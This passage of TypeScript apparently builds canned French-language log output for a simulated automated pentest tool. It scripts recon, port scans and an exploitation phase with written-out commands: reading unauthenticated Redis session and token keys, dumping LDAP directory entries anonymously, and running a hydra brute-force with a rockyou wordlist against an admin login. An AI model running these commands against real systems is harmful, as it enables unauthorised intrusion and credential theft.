      { level: "CMD", source: "redamon", message: `$ redamon --phase full --target ${t} --profile ${ctx.profile}` },
      { level: "INFO", source: "redamon", message: "lancement : énumération passive puis active, scan de ports complet, exploitation" },
      { level: "INFO", source: "system", message: "wordlists chargées : subdomains-top1m, ports-top1000, rockyou (échantillon)" },
      { level: "INFO", source: "redamon", message: "respect du périmètre : aucune attaque DoS, débit limité à 50 req/s" },
    ],
    // ENUM SOUS-DOMAINES
    [
      { level: "CMD", source: "redamon", message: `$ amass enum -d ${host} -passive -o amass.txt` },
      { level: "INFO", source: "amass", message: `staging.${host} (CNAME <app>.azurewebsites.net)` },
      { level: "INFO", source: "amass", message: `api.${host} (A 203.0.113.24)` },
      { level: "INFO", source: "amass", message: `dev.${host} (A 203.0.113.31)` },
      { level: "INFO", source: "amass", message: `mail.${host}, vpn.${host}, jenkins.${host} — 11 sous-domaines au total` },
      { level: "CMD", source: "redamon", message: "$ httpx -l amass.txt -silent -status-code -title" },
      { level: "INFO", source: "httpx", message: "7/11 sous-domaines actifs (200/301)" },
      { level: "WARN", source: "redamon", message: `staging.${host} répond 404 sur un CNAME cloud — takeover probable` },
      { level: "TOOL", source: "redamon", message: "tool_call: amass (1.8s, 11 sous-domaines)" },
      { level: "INFO", source: "redamon", message: "certificats SAN analysés (miroir crt.sh local) : 3 noms additionnels" },
    ],
    // SCAN PORTS
    [
      { level: "CMD", source: "redamon", message: `$ nmap -sS -sV -p- ${t} --open -T4` },
      { level: "INFO", source: "nmap", message: "22/tcp   open  ssh       OpenSSH 7.2p2" },
      { level: "INFO", source: "nmap", message: "80/tcp   open  http      nginx" },
      { level: "INFO", source: "nmap", message: "389/tcp  open  ldap      OpenLDAP 2.4.47" },
      { level: "INFO", source: "nmap", message: "443/tcp  open  ssl/http  nginx" },
      { level: "INFO", source: "nmap", message: "6379/tcp open  redis     Redis 5.0.7" },
      { level: "INFO", source: "nmap", message: "9090/tcp open  http      prometheus (reverse proxy 80→9090)" },
      { level: "TOOL", source: "redamon", message: "tool_call: nmap (3.4s, 6 services)" },
      { level: "INFO", source: "redamon", message: "6 services exposés — 2 sans authentification (redis, ldap)" },
      { level: "CMD", source: "redamon", message: `$ nmap --script redis-info -p 6379 ${t}` },
    ],
    // FINGERPRINT
    [
      { level: "CMD", source: "redamon", message: `$ ssh-audit ${t}` },
      { level: "WARN", source: "ssh-audit", message: "ssh-rsa (SHA-1) offert — algorithme obsolète" },
      { level: "INFO", source: "ssh-audit", message: "banner OpenSSH_7.2p2 — CVE-2023-38408 applicable (agent forwarding)" },
      { level: "CMD", source: "redamon", message: `$ sslscan ${t}:443` },
      { level: "WARN", source: "sslscan", message: "TLSv1.0 accepté — suites CBC faibles" },
      { level: "INFO", source: "redamon", message: "en-têtes : X-Frame-Options absent, CSP absente sur /admin" },
      { level: "TOOL", source: "redamon", message: "tool_call: gvm (2.9s, 3 alertes moyennes)" },
      { level: "INFO", source: "gvm", message: "OpenVAS: 3 alertes moyennes (redis sans auth, ldap anonyme, ssh obsolète)" },
      { level: "INFO", source: "redamon", message: "fingerprint consolidé : 4 vecteurs d'exploitation priorisés" },
    ],
    // EXPLOITATION
    [
      { level: "CMD", source: "redamon", message: `$ redis-cli -h ${t} INFO server` },
      { level: "INFO", source: "redis", message: "redis_version:5.0.7 — CONFIG GET requirepass → \"\" (aucune auth)" },
      { level: "CMD", source: "redamon", message: `$ redis-cli -h ${t} KEYS '*' | head` },
      { level: "INFO", source: "redis", message: "14 clés sensibles (session:*, token:*) — lecture/écriture possibles" },
      { level: "CMD", source: "redamon", message: `$ ldapsearch -x -H ldap://${t} -b "dc=corp" "(objectClass=inetOrgPerson)" cn mail` },
      { level: "INFO", source: "ldap", message: "recherche anonyme acceptée — 143 entrées (mails internes, structure orga)" },
      { level: "AGENT", source: "redamon-reasoning", message: `takeover : staging.${host} → CNAME non réclamé, réservation du service simulée en sandbox` },
      { level: "CMD", source: "redamon", message: `$ hydra -l admin -P rockyou-sample.txt ${t} https-post-form "/admin/login:username=^USER^&password=^PASS^:F=invalid"` },
      { level: "WARN", source: "hydra", message: "300 tentatives sans blocage — console admin verrouillable en quelques heures" },
      { level: "AGENT", source: "redamon-reasoning", message: "réflexion : 2 criticités (redis, takeover), 3 moyens, 3 faibles — consolidation" },
    ],
    // RAPPORT
    [
      { level: "INFO", source: "redamon", message: "corrélation recon/exploit : chaque constat lié à sa preuve brute" },
      { level: "INFO", source: "redamon", message: "scoring CVSS et attribution de confiance (CONFIRMED x4, PROBABLE x4)" },
      { level: "INFO", source: "redamon", message: "PoC normalisés (commandes one-liner reproductibles)" },
      { level: "INFO", source: "system", message: "artefacts bruts archivés (nmap XML, amass log, redis dump tronqué)" },
      { level: "INFO", source: "redamon", message: "rapport transmis à la plateforme" },
    ],
  ];
  return assemble("REDAMON", ctx, segs);
}

export const SCRIPT_BUILDERS: Record<Tool, (ctx: ScriptCtx) => ScriptLine[]> = {
  PHANTOM: buildPhantomScript,
  DEEPAUDIT: buildDeepauditScript,
  BASALT: buildBasaltScript,
  REDAMON: buildRedamonScript,
};
